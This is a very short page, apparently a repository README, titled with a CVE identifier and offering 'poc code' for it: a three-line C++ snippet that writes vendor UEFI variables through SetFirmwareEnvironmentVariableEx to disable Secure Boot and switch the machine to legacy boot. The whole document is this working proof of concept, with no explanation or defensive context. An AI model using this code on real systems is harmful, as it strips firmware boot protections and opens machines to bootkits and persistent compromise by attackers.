# CVE-2021-3972

poc code without other thing

```c++
BYTE value = 0x1;
SetFirmwareEnvironmentVariableEx(_T("ChgBootSecureBootDisable"),_T("{6ACCE65D-DA35-4B39-B64B-5ED927A7DC7E}"),&value,sizeof(BYTE),0x7);
SetFirmwareEnvironmentVariableEx(_T("ChgBootChangeLegacy"),_T("{6ACCE65D-DA35-4B39-B64B-5ED927A7DC7E}"),&value,sizeof(BYTE),0x7);
```
